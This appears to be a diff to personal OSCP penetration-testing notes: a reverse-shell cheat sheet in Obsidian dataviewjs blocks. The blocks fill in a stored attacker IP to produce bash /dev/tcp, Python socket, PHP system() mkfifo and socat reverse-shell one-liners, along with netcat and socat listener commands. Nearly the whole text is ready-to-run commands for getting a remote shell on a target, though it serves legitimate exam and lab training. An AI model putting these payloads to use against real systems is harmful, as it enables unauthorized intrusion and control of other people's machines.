@@ -1,6 +1,24 @@
 https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
-One liner reverse-shell
+Find out which architecture is supported
+```
+which python3 python perl ruby socat script
+```
+
+## LINUX WEB SHELL
+
+HIGH PROBABILITY
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `bash -c "bash -i >& /dev/tcp/${KaliIP}/4444 0>&1"`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+
+---
+
+## Python One liner reverse-shell
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
@@ -15,6 +33,10 @@ const command = `python -c "import socket,subprocess,os;s=socket.socket(socket.A
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+
+---
+
+## Bash reverse shells
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
@@ -29,6 +51,9 @@ const command = `bash -c 'bash -i >& /dev/tcp/${KaliIP}/4444 0>&1'`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+
+---
+
 
 PHP METHOD 1
 
@@ -84,23 +109,31 @@ const command = `<?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
-# 🎯 Step 2 — From Web Shell (Target)
+---
 
-If it’s a Linux box (Bashed is), use:
+## Socat
 
-HIGH PROBABILITY
+On the attacker machine, we started a listener:
+```
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+```
+or
+```
+rlwrap nc -lvnp 4444
+```
+
+On the target machine, we executed the following command:
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = `bash -c "bash -i >& /dev/tcp/${KaliIP}/4444 0>&1"`;
+const command = `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${KaliIP}:4444`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
-Example:
-
-bash -c "bash -i >& /dev/tcp/10.10.16.35/4444 0>&1"
 
 ---
+
+
 
 # 🔁 If `/dev/tcp` Fails
 
